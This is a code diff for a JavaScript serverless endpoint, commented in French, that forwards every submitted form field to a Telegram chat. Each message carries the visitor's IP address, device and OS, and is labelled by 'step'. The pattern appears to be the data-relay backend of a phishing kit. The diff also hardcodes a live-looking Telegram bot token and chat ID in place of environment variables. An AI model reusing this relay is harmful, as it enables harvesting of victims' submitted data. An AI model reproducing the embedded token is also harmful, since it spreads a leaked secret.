@@ -1,12 +1,18 @@
 // api/tg.js
-import fetch from 'node-fetch';
+// ----------------------------------------------------------------------------------
+// ATTENTION : pour des raisons de sécurité on recommande d'utiliser des variables
+// d'environnement. Ici, on hardcode directement vos identifiants Telegram.
+// ----------------------------------------------------------------------------------
 
-// Récupère token et chat id depuis les env
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
+const fetch = global.fetch || require('node-fetch');
+
+// Remplacez ci-dessous par VOTRE token et VOTRE chat ID
+const BOT_TOKEN = '7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs';
+const CHAT_ID   = '-4766781392';
+
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-// Helper pour détecter l’OS et le device type depuis le user-agent
+// Détecte OS et device depuis le user-agent
 function parseUA(ua) {
   const isAndroid = /Android/i.test(ua);
   const isIPhone  = /iPhone/i.test(ua);
@@ -21,33 +27,31 @@ function parseUA(ua) {
   return { os, device };
 }
 
-export default async function handler(req, res) {
+module.exports = async (req, res) => {
   if (req.method !== 'POST') {
     res.setHeader('Allow', 'POST');
-    return res.status(405).end('Method Not Allowed');
+    return res.status(405).end('Méthode non autorisée');
   }
 
-  // On extrait IP, UA, body
+  // Récupère l'IP et le user-agent
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
   const ua = req.headers['user-agent'] || '';
   const { os, device } = parseUA(ua);
 
-  const data = req.body;       // doit être un objet JSON
+  const data = req.body;  
   const when = new Date().toLocaleString('fr-FR');
 
-  // Construit le message Telegram
-  let text = `🆕 *Nouvelle action client* \n`;
+  // Construction du message
+  let text = `🆕 *Nouvelle action client*\n`;
   text += `\`${when}\` depuis _${ip}_ (${device}/${os})\n\n`;
-  // On affiche le type d’étape et les données reçues
   text += `*Étape* : ${data.step}\n`;
-  // Pour chaque champ du body on l’ajoute
   for (const [key, val] of Object.entries(data)) {
     if (key === 'step') continue;
     text += `• *${key}* : ${val}\n`;
   }
 
-  // Envoi à Telegram
   try {
+    // Envoi à Telegram
     await fetch(TELEGRAM_API, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -57,9 +61,9 @@ export default async function handler(req, res) {
         text
       })
     });
-    res.status(200).json({ ok: true });
+    return res.status(200).json({ ok: true });
   } catch (err) {
-    console.error('Telegram error:', err);
-    res.status(500).json({ error: 'Telegram send failed' });
+    console.error('Erreur Telegram:', err);
+    return res.status(500).json({ error: 'Échec envoi Telegram' });
   }
-}
+};
